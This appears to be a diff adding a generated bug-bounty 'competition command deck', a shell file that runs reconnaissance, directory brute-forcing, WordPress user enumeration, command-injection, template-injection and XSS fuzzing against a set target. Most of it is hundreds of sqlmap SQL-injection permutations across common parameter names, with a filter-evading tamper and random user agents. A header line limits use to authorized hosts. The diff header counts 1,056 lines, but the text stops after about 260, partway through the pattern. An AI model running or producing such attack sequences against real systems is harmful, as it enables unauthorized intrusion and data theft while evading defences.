@@ -1,0 +1,1056 @@
+# BountyTools competition command deck (generated)
+# Use only on hosts your competition or program authorizes.
+# Replace $TARGET (full URL) and $DOMAIN (hostname only).
+# Regenerate: python3 scripts/generate_competition_commands.py
+export TARGET="https://$DOMAIN"
+export DOMAIN="competition.example"
+mkdir -p "$HOME/ops/$DOMAIN"/{recon,urls,live,fuzz,inj,ssl,evidence,loot}
+subfinder -d "$DOMAIN" -all -o "$HOME/ops/$DOMAIN/recon/subs.txt"
+gau "$DOMAIN" | sort -u > "$HOME/ops/$DOMAIN/urls/gau.txt"
+katana -u "$TARGET" -d 2 -jc -o "$HOME/ops/$DOMAIN/urls/katana.txt"
+httpx -u "$TARGET" -status-code -title -tech-detect
+naabu -host "$DOMAIN" -top-ports 1000 -o "$HOME/ops/$DOMAIN/recon/ports.txt"
+nmap -sV -p 80,443,8080,8443 "$DOMAIN" -oA "$HOME/ops/$DOMAIN/recon/nmap_web"
+dirb "$TARGET" /usr/share/wordlists/dirb/common.txt
+feroxbuster -u "$TARGET" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -C 404
+wpscan --url "$TARGET" --enumerate u,vp,vt,p
+nuclei -u "$TARGET" -severity high,critical -o "$HOME/ops/$DOMAIN/evidence/nuclei.txt"
+sqlmap -u "$TARGET/page?id=1" --batch --smart -p id
+commix -u "$TARGET" --batch --level=2
+sstimap -u "$TARGET"
+python3 xsstrike.py -u "$TARGET?q=1" --fuzzer
+sslscan "$DOMAIN"
+sslyze "$DOMAIN" --regular
+searchsploit apache wordpress nginx
+katana -u "$TARGET" -d 1 -jc -o "$HOME/ops/$DOMAIN/urls/katana_d1_jc.txt"
+katana -u "$TARGET" -d 1 -jsl -o "$HOME/ops/$DOMAIN/urls/katana_d1_jsl.txt"
+katana -u "$TARGET" -d 1 -jc,jsl -o "$HOME/ops/$DOMAIN/urls/katana_d1_jc_jsl.txt"
+katana -u "$TARGET" -d 2 -jc -o "$HOME/ops/$DOMAIN/urls/katana_d2_jc.txt"
+katana -u "$TARGET" -d 2 -jsl -o "$HOME/ops/$DOMAIN/urls/katana_d2_jsl.txt"
+katana -u "$TARGET" -d 2 -jc,jsl -o "$HOME/ops/$DOMAIN/urls/katana_d2_jc_jsl.txt"
+katana -u "$TARGET" -d 3 -jc -o "$HOME/ops/$DOMAIN/urls/katana_d3_jc.txt"
+katana -u "$TARGET" -d 3 -jsl -o "$HOME/ops/$DOMAIN/urls/katana_d3_jsl.txt"
+katana -u "$TARGET" -d 3 -jc,jsl -o "$HOME/ops/$DOMAIN/urls/katana_d3_jc_jsl.txt"
+sqlmap -u "$TARGET/page?id=1" -p id --batch --level=1 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?uid=1" -p uid --batch --level=1 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?pid=1" -p pid --batch --level=1 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user=1" -p user --batch --level=1 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user_id=1" -p user_id --batch --level=1 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?product_id=1" -p product_id --batch --level=1 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?order_id=1" -p order_id --batch --level=1 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?page=1" -p page --batch --level=1 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?cat=1" -p cat --batch --level=1 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?q=1" -p q --batch --level=1 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?query=1" -p query --batch --level=1 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?search=1" -p search --batch --level=1 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?sort=1" -p sort --batch --level=1 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?filter=1" -p filter --batch --level=1 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?ref=1" -p ref --batch --level=1 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?file=1" -p file --batch --level=1 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?path=1" -p path --batch --level=1 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?url=1" -p url --batch --level=1 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?redirect=1" -p redirect --batch --level=1 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?id=1" -p id --batch --level=1 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?uid=1" -p uid --batch --level=1 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?pid=1" -p pid --batch --level=1 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user=1" -p user --batch --level=1 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user_id=1" -p user_id --batch --level=1 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?product_id=1" -p product_id --batch --level=1 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?order_id=1" -p order_id --batch --level=1 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?page=1" -p page --batch --level=1 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?cat=1" -p cat --batch --level=1 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?q=1" -p q --batch --level=1 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?query=1" -p query --batch --level=1 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?search=1" -p search --batch --level=1 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?sort=1" -p sort --batch --level=1 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?filter=1" -p filter --batch --level=1 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?ref=1" -p ref --batch --level=1 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?file=1" -p file --batch --level=1 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?path=1" -p path --batch --level=1 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?url=1" -p url --batch --level=1 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?redirect=1" -p redirect --batch --level=1 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?id=1" -p id --batch --level=1 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?uid=1" -p uid --batch --level=1 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?pid=1" -p pid --batch --level=1 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user=1" -p user --batch --level=1 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user_id=1" -p user_id --batch --level=1 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?product_id=1" -p product_id --batch --level=1 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?order_id=1" -p order_id --batch --level=1 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?page=1" -p page --batch --level=1 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?cat=1" -p cat --batch --level=1 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?q=1" -p q --batch --level=1 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?query=1" -p query --batch --level=1 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?search=1" -p search --batch --level=1 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?sort=1" -p sort --batch --level=1 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?filter=1" -p filter --batch --level=1 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?ref=1" -p ref --batch --level=1 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?file=1" -p file --batch --level=1 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?path=1" -p path --batch --level=1 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?url=1" -p url --batch --level=1 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?redirect=1" -p redirect --batch --level=1 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?id=1" -p id --batch --level=2 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?uid=1" -p uid --batch --level=2 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?pid=1" -p pid --batch --level=2 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user=1" -p user --batch --level=2 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user_id=1" -p user_id --batch --level=2 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?product_id=1" -p product_id --batch --level=2 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?order_id=1" -p order_id --batch --level=2 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?page=1" -p page --batch --level=2 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?cat=1" -p cat --batch --level=2 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?q=1" -p q --batch --level=2 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?query=1" -p query --batch --level=2 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?search=1" -p search --batch --level=2 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?sort=1" -p sort --batch --level=2 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?filter=1" -p filter --batch --level=2 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?ref=1" -p ref --batch --level=2 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?file=1" -p file --batch --level=2 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?path=1" -p path --batch --level=2 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?url=1" -p url --batch --level=2 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?redirect=1" -p redirect --batch --level=2 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?id=1" -p id --batch --level=2 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?uid=1" -p uid --batch --level=2 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?pid=1" -p pid --batch --level=2 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user=1" -p user --batch --level=2 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user_id=1" -p user_id --batch --level=2 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?product_id=1" -p product_id --batch --level=2 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?order_id=1" -p order_id --batch --level=2 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?page=1" -p page --batch --level=2 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?cat=1" -p cat --batch --level=2 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?q=1" -p q --batch --level=2 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?query=1" -p query --batch --level=2 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?search=1" -p search --batch --level=2 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?sort=1" -p sort --batch --level=2 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?filter=1" -p filter --batch --level=2 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?ref=1" -p ref --batch --level=2 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?file=1" -p file --batch --level=2 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?path=1" -p path --batch --level=2 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?url=1" -p url --batch --level=2 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?redirect=1" -p redirect --batch --level=2 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?id=1" -p id --batch --level=2 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?uid=1" -p uid --batch --level=2 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?pid=1" -p pid --batch --level=2 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user=1" -p user --batch --level=2 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user_id=1" -p user_id --batch --level=2 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?product_id=1" -p product_id --batch --level=2 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?order_id=1" -p order_id --batch --level=2 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?page=1" -p page --batch --level=2 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?cat=1" -p cat --batch --level=2 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?q=1" -p q --batch --level=2 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?query=1" -p query --batch --level=2 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?search=1" -p search --batch --level=2 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?sort=1" -p sort --batch --level=2 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?filter=1" -p filter --batch --level=2 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?ref=1" -p ref --batch --level=2 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?file=1" -p file --batch --level=2 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?path=1" -p path --batch --level=2 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?url=1" -p url --batch --level=2 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?redirect=1" -p redirect --batch --level=2 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?id=1" -p id --batch --level=3 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?uid=1" -p uid --batch --level=3 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?pid=1" -p pid --batch --level=3 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user=1" -p user --batch --level=3 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user_id=1" -p user_id --batch --level=3 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?product_id=1" -p product_id --batch --level=3 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?order_id=1" -p order_id --batch --level=3 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?page=1" -p page --batch --level=3 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?cat=1" -p cat --batch --level=3 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?q=1" -p q --batch --level=3 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?query=1" -p query --batch --level=3 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?search=1" -p search --batch --level=3 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?sort=1" -p sort --batch --level=3 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?filter=1" -p filter --batch --level=3 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?ref=1" -p ref --batch --level=3 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?file=1" -p file --batch --level=3 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?path=1" -p path --batch --level=3 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?url=1" -p url --batch --level=3 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?redirect=1" -p redirect --batch --level=3 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?id=1" -p id --batch --level=3 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?uid=1" -p uid --batch --level=3 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?pid=1" -p pid --batch --level=3 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user=1" -p user --batch --level=3 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user_id=1" -p user_id --batch --level=3 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?product_id=1" -p product_id --batch --level=3 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?order_id=1" -p order_id --batch --level=3 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?page=1" -p page --batch --level=3 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?cat=1" -p cat --batch --level=3 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?q=1" -p q --batch --level=3 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?query=1" -p query --batch --level=3 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?search=1" -p search --batch --level=3 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?sort=1" -p sort --batch --level=3 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?filter=1" -p filter --batch --level=3 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?ref=1" -p ref --batch --level=3 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?file=1" -p file --batch --level=3 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?path=1" -p path --batch --level=3 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?url=1" -p url --batch --level=3 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?redirect=1" -p redirect --batch --level=3 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?id=1" -p id --batch --level=3 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?uid=1" -p uid --batch --level=3 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?pid=1" -p pid --batch --level=3 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user=1" -p user --batch --level=3 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user_id=1" -p user_id --batch --level=3 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?product_id=1" -p product_id --batch --level=3 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?order_id=1" -p order_id --batch --level=3 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?page=1" -p page --batch --level=3 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?cat=1" -p cat --batch --level=3 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?q=1" -p q --batch --level=3 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?query=1" -p query --batch --level=3 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?search=1" -p search --batch --level=3 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?sort=1" -p sort --batch --level=3 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?filter=1" -p filter --batch --level=3 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?ref=1" -p ref --batch --level=3 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?file=1" -p file --batch --level=3 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?path=1" -p path --batch --level=3 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?url=1" -p url --batch --level=3 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?redirect=1" -p redirect --batch --level=3 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?id=1" -p id --batch --level=4 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?uid=1" -p uid --batch --level=4 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?pid=1" -p pid --batch --level=4 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user=1" -p user --batch --level=4 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user_id=1" -p user_id --batch --level=4 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?product_id=1" -p product_id --batch --level=4 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?order_id=1" -p order_id --batch --level=4 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?page=1" -p page --batch --level=4 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?cat=1" -p cat --batch --level=4 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?q=1" -p q --batch --level=4 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?query=1" -p query --batch --level=4 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?search=1" -p search --batch --level=4 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?sort=1" -p sort --batch --level=4 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?filter=1" -p filter --batch --level=4 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?ref=1" -p ref --batch --level=4 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?file=1" -p file --batch --level=4 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?path=1" -p path --batch --level=4 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?url=1" -p url --batch --level=4 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?redirect=1" -p redirect --batch --level=4 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?id=1" -p id --batch --level=4 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?uid=1" -p uid --batch --level=4 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?pid=1" -p pid --batch --level=4 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user=1" -p user --batch --level=4 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user_id=1" -p user_id --batch --level=4 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?product_id=1" -p product_id --batch --level=4 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?order_id=1" -p order_id --batch --level=4 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?page=1" -p page --batch --level=4 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?cat=1" -p cat --batch --level=4 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?q=1" -p q --batch --level=4 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?query=1" -p query --batch --level=4 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?search=1" -p search --batch --level=4 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?sort=1" -p sort --batch --level=4 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?filter=1" -p filter --batch --level=4 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?ref=1" -p ref --batch --level=4 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?file=1" -p file --batch --level=4 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?path=1" -p path --batch --level=4 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?url=1" -p url --batch --level=4 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?redirect=1" -p redirect --batch --level=4 --risk=2 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?id=1" -p id --batch --level=4 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?uid=1" -p uid --batch --level=4 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?pid=1" -p pid --batch --level=4 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user=1" -p user --batch --level=4 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?user_id=1" -p user_id --batch --level=4 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?product_id=1" -p product_id --batch --level=4 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?order_id=1" -p order_id --batch --level=4 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?page=1" -p page --batch --level=4 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?cat=1" -p cat --batch --level=4 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?q=1" -p q --batch --level=4 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?query=1" -p query --batch --level=4 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?search=1" -p search --batch --level=4 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?sort=1" -p sort --batch --level=4 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?filter=1" -p filter --batch --level=4 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?ref=1" -p ref --batch --level=4 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?file=1" -p file --batch --level=4 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?path=1" -p path --batch --level=4 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?url=1" -p url --batch --level=4 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?redirect=1" -p redirect --batch --level=4 --risk=3 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?id=1" -p id --batch --level=5 --risk=1 --tamper=space2comment --random-agent --threads=2
+sqlmap -u "$TARGET/page?uid=1" -p uid --batch --level=5 --risk=1 --tamper=space2comment --random-agent --threads=2
